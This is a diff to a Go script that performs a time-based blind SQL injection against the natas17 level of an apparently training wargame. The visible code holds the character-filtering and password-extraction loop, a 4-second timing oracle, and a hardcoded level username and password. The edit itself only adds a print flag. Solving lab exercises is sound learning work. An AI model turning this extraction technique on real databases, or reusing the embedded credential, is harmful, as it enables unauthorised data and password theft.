@@ -12,11 +12,11 @@ func main() {
 	pass := ""
 	c := 0
 	error := false
-	newStri  := []string{}
+	newStri := []string{}
 
 	// Verifico i caratteri contenuti nella stringa
 	for _, abc := range arr {
-		if result("%"+abc) {
+		if result("%"+abc, false) {
 			newStri = append(newStri, abc)
 			fmt.Print(abc)
 		}
@@ -25,7 +25,7 @@ func main() {
 	for {
 		for i, abc := range newStri {
 			fmt.Print(abc)
-			if result(pass + abc) {
+			if result(pass+abc, true) {
 				pass = pass + abc
 				fmt.Print("\n", len(pass), "\t", pass, "\n\n")
 				break
@@ -47,7 +47,7 @@ func main() {
 }
 
 //SQL Injection time based
-func result(pass string) bool {
+func result(pass string, isPrint bool) bool {
 
 	usr := "natas17"
 	psw := "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
@@ -71,7 +71,10 @@ func result(pass string) bool {
 	*/
 
 	if ellapsed.Seconds() > 4 {
-		fmt.Print("\t", ellapsed.Seconds())
+		if isPrint {
+			fmt.Print("\t", ellapsed.Seconds())
+		}
+
 		return true
 	}
 	return false
